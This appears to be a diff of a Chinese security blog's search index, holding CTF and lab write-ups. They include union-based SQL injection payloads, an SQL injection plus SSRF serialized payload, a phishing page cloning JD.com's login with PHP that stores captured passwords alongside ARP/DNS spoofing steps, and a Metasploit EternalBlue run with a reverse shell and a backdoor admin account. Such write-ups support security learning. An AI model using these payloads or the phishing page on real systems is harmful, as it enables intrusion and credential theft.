@@ -103,6 +103,37 @@ ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre><p>0x637466 为十六进制ctf</p>
       </tags>
   </entry>
   <entry>
+    <title>guestbook</title>
+    <url>/2020/04/18/Guestbook/</url>
+    <content><![CDATA[<h1 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a><a href="https://hackme.inndy.tw/gb/?mod=new">guestbook</a></h1><span id="more"></span>
+<p>题目提示：<strong>This guestbook sucks. sqlmap is your friend.</strong> 是sql注入<br>点击Message List 时是空的， 点击post是可以提交新信息，点击查看新信息</p>
+<p>在id值后加上” ‘ “测试是否存在测试点网页报错说明存在注入点<br>union 注入!<br>查看列</p>
+<pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>hackme.inndy.tw<span class="hljs-regexp">/gb/</span>?mod=read&amp;id=-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>%<span class="hljs-number">20</span><span class="hljs-comment">#</span>
+<span class="hljs-regexp">//i</span>d=-<span class="hljs-number">1</span> 是让前面的内容不显示</code></pre>
+<p>3被回显</p>
+<p>1.查看数据库名</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">https</span>://hackme.inndy.tw/gb/?mod=read&amp;id=-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,database(),<span class="hljs-number">4</span>%<span class="hljs-number">20</span>#</code></pre>
+
+<p>数据库的名字<code>g8</code></p>
+<p>2.查看表名</p>
+<pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre>
+<p>发现有一个表 <code>flag</code></p>
+<p>3.测试表的字段</p>
+<pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre>
+<p>仍然显示<code>flag</code></p>
+<p>4.读取flag   </p>
+<pre><code class="hljs apache"><span class="hljs-attribute">https</span>://hackme.inndy.tw/gb/?mod=read&amp;id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(select flag from flag limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre>
+
+<p>得到flag!</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>IDscan</title>
     <url>/2021/07/28/IDscan/</url>
     <content><![CDATA[<p>一个针对URL的简单敏感信息扫描器</p>
@@ -378,6 +409,18 @@ http:<span class="hljs-regexp">//</span>www.baidu.com:<span class="hljs-number">
       </categories>
       <tags>
         <tag>scan</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SSTI</title>
+    <url>/2020/08/16/SSTI/</url>
+    <content><![CDATA[<p><img src="https://i.loli.net/2020/11/30/LAJfgePG7qsKph4.png" alt><br><code>https://www.cnblogs.com/wangtanzhi/p/12238779.html</code></p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>STTI</tag>
       </tags>
   </entry>
   <entry>
@@ -688,49 +731,6 @@ getVars();
       </tags>
   </entry>
   <entry>
-    <title>guestbook</title>
-    <url>/2020/04/18/Guestbook/</url>
-    <content><![CDATA[<h1 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a><a href="https://hackme.inndy.tw/gb/?mod=new">guestbook</a></h1><span id="more"></span>
-<p>题目提示：<strong>This guestbook sucks. sqlmap is your friend.</strong> 是sql注入<br>点击Message List 时是空的， 点击post是可以提交新信息，点击查看新信息</p>
-<p>在id值后加上” ‘ “测试是否存在测试点网页报错说明存在注入点<br>union 注入!<br>查看列</p>
-<pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>hackme.inndy.tw<span class="hljs-regexp">/gb/</span>?mod=read&amp;id=-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>%<span class="hljs-number">20</span><span class="hljs-comment">#</span>
-<span class="hljs-regexp">//i</span>d=-<span class="hljs-number">1</span> 是让前面的内容不显示</code></pre>
-<p>3被回显</p>
-<p>1.查看数据库名</p>
-<pre><code class="hljs apache"><span class="hljs-attribute">https</span>://hackme.inndy.tw/gb/?mod=read&amp;id=-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,database(),<span class="hljs-number">4</span>%<span class="hljs-number">20</span>#</code></pre>
-
-<p>数据库的名字<code>g8</code></p>
-<p>2.查看表名</p>
-<pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre>
-<p>发现有一个表 <code>flag</code></p>
-<p>3.测试表的字段</p>
-<pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre>
-<p>仍然显示<code>flag</code></p>
-<p>4.读取flag   </p>
-<pre><code class="hljs apache"><span class="hljs-attribute">https</span>://hackme.inndy.tw/gb/?mod=read&amp;id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(select flag from flag limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre>
-
-<p>得到flag!</p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SSTI</title>
-    <url>/2020/08/16/SSTI/</url>
-    <content><![CDATA[<p><img src="https://i.loli.net/2020/11/30/LAJfgePG7qsKph4.png" alt><br><code>https://www.cnblogs.com/wangtanzhi/p/12238779.html</code></p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>STTI</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>arp attack</title>
     <url>/2020/11/27/attack/</url>
     <content><![CDATA[<h1 id="arp攻击"><a href="#arp攻击" class="headerlink" title="arp攻击"></a>arp攻击</h1><p>ARP（Address Resolution Protocol，地址解析协议是一个位于<a href="https://baike.baidu.com/item/TCP%2FIP协议">TCP/IP协议</a>栈中的网络层，负责将某个<a href="https://baike.baidu.com/item/IP地址">IP地址</a>解析成对应的<a href="https://baike.baidu.com/item/MAC地址">MAC地址</a>。</p>
@@ -769,6 +769,17 @@ getVars();
       </categories>
       <tags>
         <tag>arp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>buuctf-LFI</title>
+    <url>/2020/10/08/buuoj-LFI/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>LFI</tag>
       </tags>
   </entry>
   <entry>
@@ -998,17 +1009,6 @@ print(flag.text)</code></pre>]]></content>
         <tag>域名解析</tag>
         <tag>爆破</tag>
         <tag>脚本</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>buuctf-LFI</title>
-    <url>/2020/10/08/buuoj-LFI/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>LFI</tag>
       </tags>
   </entry>
   <entry>
@@ -1276,44 +1276,6 @@ print(<span class="hljs-string">&#x27;flag=&#x27;</span>, flag)</code></pre>
         <tag>二分注入</tag>
         <tag>报错注入</tag>
         <tag>union新姿势</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>diaoyu</title>
-    <url>/2020/07/18/diaoyu/</url>
-    <content><![CDATA[<h1 id="DNS欺骗、ARP攻击及钓鱼网站制作"><a href="#DNS欺骗、ARP攻击及钓鱼网站制作" class="headerlink" title="DNS欺骗、ARP攻击及钓鱼网站制作"></a>DNS欺骗、ARP攻击及钓鱼网站制作</h1><span id="more"></span>
-<p>1.实验目的<br>获取登录jd网页的用户名和密码<br>2.实验主机<br>一台kali,两台win2003,其中一台为客户机，一台为服务器，kali作为攻击者<br>3.实验材料<br>京东登录网页及其所有图片（浏览器访问<a href="https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F">https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F</a> 之后保存网页即可）<br><img src="https://i.loli.net/2020/11/30/LOSJIsP4luKBQxA.png" alt><br>修改index.html中的内容<br><img src="https://i.loli.net/2020/11/30/jyiqQNSlnEt43XL.png" alt><br>error.php中的内容如下<br>关键代码（用于保存用户名和密码以及迷惑用户）</p>
-<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-variable">$nam</span> = stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>]); <span class="hljs-comment">//name 是由网页的表单信息决定，不同的网页对应不同的内容，这一点很重要</span>
-<span class="hljs-variable">$pas</span> = stripslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-comment">//pass也一样</span>
-<span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;您已捕获京东账号及密码1个：&quot;</span> . <span class="hljs-string">&quot; 用户名 &quot;</span> . <span class="hljs-variable">$nam</span> . <span class="hljs-string">&quot; 密码 &quot;</span> . <span class="hljs-variable">$pas</span>;   <span class="hljs-comment">//保存捕获的用户名和密码</span>
-<span class="hljs-variable">$filed</span> = @fopen(<span class="hljs-string">&quot;1.txt&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>);   <span class="hljs-comment">//打开1.txt</span>
-@fwrite(<span class="hljs-variable">$filed</span>, <span class="hljs-string">&quot;<span class="hljs-subst">$content</span>\n&quot;</span>);     <span class="hljs-comment">//将用户名和密码写入1.txt</span>
-<span class="hljs-meta">?&gt;</span>
-&lt;html&gt;
-&lt;head&gt;
-&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;
-		<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">goBack</span>(<span class="hljs-params"></span>)</span>
-<span class="hljs-function">		</span>&#123;
-			window.history.back() <span class="hljs-comment">//后退+刷新</span>
-		&#125;
-&lt;/script&gt;
-&lt;/head&gt;
-&lt;body onload=<span class="hljs-string">&quot;goBack()&quot;</span>&gt; &lt;!-- 加载之后立即执行一段 JavaScript --&gt;
-&lt;/body&gt;
-&lt;/html&gt;</code></pre>
-<p>4.实验拓扑图<br><img src="/2020/07/18/diaoyu/tuopu.png" alt></p>
-<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="一-部署京东的服务器"><a href="#一-部署京东的服务器" class="headerlink" title="一.部署京东的服务器"></a>一.部署京东的服务器</h3><p>1.安装DNS和web服务器（具体步骤略）<br>2.配置DNS服务器<br>a.在正向解析中建一个区域名字为jd ip为服务器地址（10.1.1.1）<br>b.在jd域中新建一台主机  <a href="http://www.jd.com">www.jd.com</a>    ip:10.1.1.1</p>
-<p>2.IIS<br>a.将默认网站停止<br>b.新建网站jd.com,文件路径为保存的jd网页<br>c.打开web服务中的asp（因为此网站不是静态网站）<br><img src="https://i.loli.net/2020/11/30/gJ3jo84Zvlp1PLh.png" alt><br>（使用2003客户机访问<a href="http://www.jd.com看看网站发布是否成功）">www.jd.com看看网站发布是否成功）</a></p>
-<h3 id="二-部署kali"><a href="#二-部署kali" class="headerlink" title="二.部署kali"></a>二.部署kali</h3><p>1.将钓鱼网页的所有文件放到 kali 的/var/www/html/路径下， 并修改 1.txt 的权限， 使这个文档可以写入数据。<br><img src="https://i.loli.net/2020/11/30/JVq4XPL85nHChi6.png" alt><br>2.开启apache服务，并检查80端口是否已开启<br><code>systemctl start apache2</code><br><code>netstat -antpl</code><br><img src="https://i.loli.net/2020/11/30/h76CQJgyL3VMka8.png" alt><br>3.修改DNS欺骗配置文件，使用 vim 编辑器， 命令：vim /etc/ettercap/etter.dns，然后 添加一条 A 记录，<br>添加一条 PTR 记录，使用户访问<a href="http://www.jd.com，指向为10.1.1.2">www.jd.com，指向为10.1.1.2</a><br>  <img src="https://i.loli.net/2020/11/30/oAzX9aDBfH2qRMu.png" alt><br><code>选中一行后，按两次d可删除内容</code><br><code>想要编辑时，先按i(insert)</code><br><code>编辑结束后  :wq 保存</code><br>4.打开ettercap软件<br>5.选择sniff–unified sniffing，并选择监听eth0<br>6.然后选择Hosts——Scan for hosts–扫描完成后选择Hosts——Hosts list,可以看到扫描到的主机<br>7.添加欺骗记录<br>选中10.1.1.1，点击Add to Target 1 选中10.1.1.3，点击Add to Target 2<br>8.在Mitm选择ARP欺骗<br><img src="https://i.loli.net/2020/11/30/yPgL23A1kcTfFED.png" alt><br>在弹出的窗口中，勾选第一个点击确定<br><img src="/2020/07/18/diaoyu/6.png" alt><br>9.选择plugins – Manage the plugins，准备进行DNS欺骗<br>在弹出的窗口中， 找到 dns spoof 并双击出现*号，开始DNS欺骗</p>
-<h3 id="三-用户访问登录页面"><a href="#三-用户访问登录页面" class="headerlink" title="三.用户访问登录页面"></a>三.用户访问登录页面</h3><p>1.在客户机中在中，再次登录<a href="http://www.jd.com输入用户名密码然后点击登录">www.jd.com输入用户名密码然后点击登录</a></p>
-<p>2.在kali虚拟机中，已经钓鱼成功，并钓到京东的登录账户及密码(cat 1.txt)<br><img src="https://i.loli.net/2020/11/30/OFsx34ZUAGBI9CP.png" alt></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>DNS</tag>
       </tags>
   </entry>
   <entry>
@@ -1723,150 +1685,6 @@ password<span class="hljs-operator">=</span><span class="hljs-number">42</span><
       </tags>
   </entry>
   <entry>
-    <title>fakebook</title>
-    <url>/2020/09/27/fakebook/</url>
-    <content><![CDATA[<h1 id="攻防世界-fakebook"><a href="#攻防世界-fakebook" class="headerlink" title="攻防世界-fakebook"></a>攻防世界-fakebook</h1><p>感觉挺有意思的一道题，所以记录一下吧</p>
-<span id="more"></span>
-
-<h2 id="0x01发现注入点"><a href="#0x01发现注入点" class="headerlink" title="0x01发现注入点"></a>0x01发现注入点</h2><p>进入网页发现是一个博客页面，先随便注册一个账号登录上去看看，发现了一个貌似可以注入的地方</p>
-<p><code>http://220.249.52.133:44224/view.php?no=1</code>参数no这里应该是一个数字型的注入点，测试一下。</p>
-<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=1</code>显示是正常的，但是</p>
-<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=2</code>网页报错，确定了就是数字型注入</p>
-<p>接下来继续注入的常规操作。</p>
-<p><code>http://220.249.52.133:44224/view.php?no=-2 order by 4#</code>时页面显示正常，并提示了网站的根目录</p>
-<p><img src="https://i.loli.net/2020/11/30/oIDBgmVNszZ3raw.png" alt></p>
-<p>但是当 order by 5 # 时，网页报错，确定是四列。</p>
-<p><strong>爆表名</strong></p>
-<p>本以为会顺利的爆破出来，但是提示了 hacker ，这里可能存在黑名单检测</p>
-<p>试了试双写绕过，发现继续提示hack，再试试用/**/替换空格，这次居然可以了，暂且当它是禁了空格。这里还出现一个提示</p>
-<p><strong>Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31</strong> 提示存在反序列化，但是不知道怎么用继续爆表。</p>
-<p><img src="https://i.loli.net/2020/11/30/RT5xSpfQ4XJakrF.png" alt></p>
-<p><code>?no=-2/**/union/**/select/**/1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4#</code></p>
-<p><code>?no=-2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;#</code></p>
-<p>爆出一大堆列名。直接读取data的内容</p>
-<p><strong>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</strong></p>
-<p><code>?no=-2 union/**/select 1,(select data from users),3,4 #</code></p>
-<p>发现内容是注册时信息保存为序列化内容</p>
-<p>O:8:”UserInfo”:3:{s:4:”name”;s:5:”sunzy”;s:3:”age”;i:22;s:4:”blog”;s:12:”22.github.io”;}</p>
-<p>到这里就不知道怎么办了。。。</p>
-<h2 id="0x02审计源码"><a href="#0x02审计源码" class="headerlink" title="0x02审计源码"></a>0x02审计源码</h2><p>扫描一下目录发现了robots.txt，其中给出来了源码备份文件的路径</p>
-<p><img src="https://i.loli.net/2020/11/30/inMDXtwCpoTqgrc.png" alt></p>
-<p>源码</p>
-<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span>   //<span class="hljs-title">user</span>信息类</span>
-<span class="hljs-class"></span>&#123;
-    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;
-    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;
-    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;
-<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span>
-<span class="hljs-function"></span>&#123;
-    <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;
-    <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;
-    <span class="hljs-keyword">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;
-&#125;
-
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) // 处理<span class="hljs-title">url</span></span>
-<span class="hljs-function"></span>&#123;
-    <span class="hljs-variable">$ch</span> = curl_init();
-
-    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);
-    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
-    <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);
-    <span class="hljs-variable">$httpCode</span> = curl_getinfo(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);
-    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;
-        <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;
-    &#125;
-    curl_close(<span class="hljs-variable">$ch</span>);
-
-    <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;
-&#125;
-
-<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span>
-<span class="hljs-function"></span>&#123;
-    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);
-&#125;
-
-<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span>
-<span class="hljs-function"></span>&#123;
-    <span class="hljs-variable">$blog</span> = <span class="hljs-keyword">$this</span>-&gt;blog;
-    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);
-&#125;
-&#125;</code></pre>
-<p>审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。</p>
-<p><strong>思路：利用no参数进行注入，在反序列化中构造file文件协议，利用服务端请求伪造漏洞访问服务器上的flag.php文件。</strong></p>
-<pre><code class="hljs ada">?no=-<span class="hljs-number">2</span>%<span class="hljs-number">20</span>union/**/<span class="hljs-keyword">select</span>%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;sunzy&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">22</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;%<span class="hljs-number">20</span>#</code></pre>
-
-<p>查看源码，解base64。</p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>sql</tag>
-        <tag>unserailize</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网安作业1</title>
-    <url>/2020/09/27/homework/</url>
-    <content><![CDATA[<h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><span id="more"></span>
-
-<h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h2><p>开启两台虚拟机，一台kali作为攻击方，一台win7作为被攻击方</p>
-<p>将两台虚拟机桥接到同一网卡，并保证能够通信</p>
-<p>Kali IP 10.1.1.1  255.0.0.0  win7 IP　10.1.1.2  255.0.0.0</p>
-<p>测试两台主机之间的通信情况</p>
-<p><img src="https://i.loli.net/2020/11/30/BAUIrJYP4ahwb3Z.png" alt="1.png"></p>
-<p><img src="https://i.loli.net/2020/11/30/skpyjBZi8T94hbO.png" alt="2.png"> </p>
-<p>使用msf前需要开启postgresql服务 </p>
-<p>开启服务：service postgresql start </p>
-<p>查看服务状态：service postgresql status</p>
-<p>开到绿色字体的active即为开启了</p>
-<p>初始化数据库：msfdb init </p>
-<p><img src="https://i.loli.net/2020/11/30/g72amLUwHvp3jSe.png" alt="3.png"> </p>
-<h2 id="2-攻击过程"><a href="#2-攻击过程" class="headerlink" title="2. 攻击过程"></a>2. 攻击过程</h2><h3 id="1-首先判断目标主机是否打开445端口"><a href="#1-首先判断目标主机是否打开445端口" class="headerlink" title="(1).首先判断目标主机是否打开445端口"></a>(1).首先判断目标主机是否打开445端口</h3><p>使用nmap+ip 扫描</p>
-<h3 id="2-确认目标主机打开445端口后直接使用msf进行攻击"><a href="#2-确认目标主机打开445端口后直接使用msf进行攻击" class="headerlink" title="(2) .确认目标主机打开445端口后直接使用msf进行攻击"></a>(2) .确认目标主机打开445端口后直接使用msf进行攻击</h3><p>输入msfconsole　启动msf</p>
-<p>输入search　MS17-010</p>
-<p>找到exploit windows/smb/ms17_010_eternalblue,</p>
-<p>运行</p>
-<pre><code class="hljs apache"><span class="hljs-attribute">use</span> exploitwindows/smb/ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span>_eternalblue</code></pre>
-
-<p>输入 show options  查看需要配置哪些信息</p>
-<p>RHOSTS 为目标主机IP(10.1.1.2)</p>
-<p>RPORT 为目标端口号(445)</p>
-<p>LHOST 为监听主机IP(10.1.1.1)</p>
-<p><img src="https://i.loli.net/2020/11/30/adxKYb5StmsJWF7.png" alt="5.png"> </p>
-<p> <img src="https://i.loli.net/2020/11/30/bq6YZiehzAtxEcu.png" alt="6.png"></p>
-<h3 id="3-配置成功后设置tcp连接"><a href="#3-配置成功后设置tcp连接" class="headerlink" title="(3). 配置成功后设置tcp连接"></a>(3). 配置成功后设置tcp连接</h3><p>输入命令</p>
-<pre><code class="hljs awk">set payload windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp</code></pre>
-
-
-
-<h3 id="4-开始运行"><a href="#4-开始运行" class="headerlink" title="(4).开始运行"></a>(4).开始运行</h3><p>输入 exploit/run </p>
-<p>成功获取shell</p>
-<p><img src="https://i.loli.net/2020/11/30/Cyj8Kt6ldzMbGh9.png" alt="7.png"></p>
-<p>查看ip地址验证是否为目标主机。</p>
-<p> <img src="https://i.loli.net/2020/11/30/OTBhu37xXEv2Pb8.png" alt="8.png"></p>
-<h3 id="5-设立后门，在目标主机中创建一个用户"><a href="#5-设立后门，在目标主机中创建一个用户" class="headerlink" title="(5)设立后门，在目标主机中创建一个用户"></a>(5)设立后门，在目标主机中创建一个用户</h3><p>创建一个用户</p>
-<pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">test</span> abc123.com /add</code></pre>
-
-<p>Username:test </p>
-<p>password:abc123.com</p>
-<p>将该用户加入管理员组，使其拥有管理员权限</p>
-<pre><code class="hljs stata"><span class="hljs-keyword">net</span> localgroup administrtors <span class="hljs-keyword">test</span> /add</code></pre>
-
-<p><img src="https://i.loli.net/2020/11/30/LAqgMpZ9kUSd6ow.png" alt="10.png"></p>
-<p>目标主机上用户创建成功</p>
-<p><img src="https://i.loli.net/2020/11/30/LPm3HzVNfW5k947.png" alt="11.png"></p>
-<p>  <strong>实验结束</strong></p>
-]]></content>
-      <categories>
-        <category>网安作业</category>
-      </categories>
-      <tags>
-        <tag>msf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>flask</title>
     <url>/2021/02/08/flask/</url>
     <content><![CDATA[<p>flask框架类型的题目，在最近几次的比赛中经常出现，但是每次出现都会让人苦不堪言，因为实在是不了解该类型的题目，所以有必要花时间总结一下该类型题目的套路</p>
@@ -2251,6 +2069,188 @@ POST:h=<span class="hljs-keyword">cat</span> <span class="hljs-keyword">f</span>
       </categories>
   </entry>
   <entry>
+    <title>网安作业1</title>
+    <url>/2020/09/27/homework/</url>
+    <content><![CDATA[<h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><span id="more"></span>
+
+<h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h2><p>开启两台虚拟机，一台kali作为攻击方，一台win7作为被攻击方</p>
+<p>将两台虚拟机桥接到同一网卡，并保证能够通信</p>
+<p>Kali IP 10.1.1.1  255.0.0.0  win7 IP　10.1.1.2  255.0.0.0</p>
+<p>测试两台主机之间的通信情况</p>
+<p><img src="https://i.loli.net/2020/11/30/BAUIrJYP4ahwb3Z.png" alt="1.png"></p>
+<p><img src="https://i.loli.net/2020/11/30/skpyjBZi8T94hbO.png" alt="2.png"> </p>
+<p>使用msf前需要开启postgresql服务 </p>
+<p>开启服务：service postgresql start </p>
+<p>查看服务状态：service postgresql status</p>
+<p>开到绿色字体的active即为开启了</p>
+<p>初始化数据库：msfdb init </p>
+<p><img src="https://i.loli.net/2020/11/30/g72amLUwHvp3jSe.png" alt="3.png"> </p>
+<h2 id="2-攻击过程"><a href="#2-攻击过程" class="headerlink" title="2. 攻击过程"></a>2. 攻击过程</h2><h3 id="1-首先判断目标主机是否打开445端口"><a href="#1-首先判断目标主机是否打开445端口" class="headerlink" title="(1).首先判断目标主机是否打开445端口"></a>(1).首先判断目标主机是否打开445端口</h3><p>使用nmap+ip 扫描</p>
+<h3 id="2-确认目标主机打开445端口后直接使用msf进行攻击"><a href="#2-确认目标主机打开445端口后直接使用msf进行攻击" class="headerlink" title="(2) .确认目标主机打开445端口后直接使用msf进行攻击"></a>(2) .确认目标主机打开445端口后直接使用msf进行攻击</h3><p>输入msfconsole　启动msf</p>
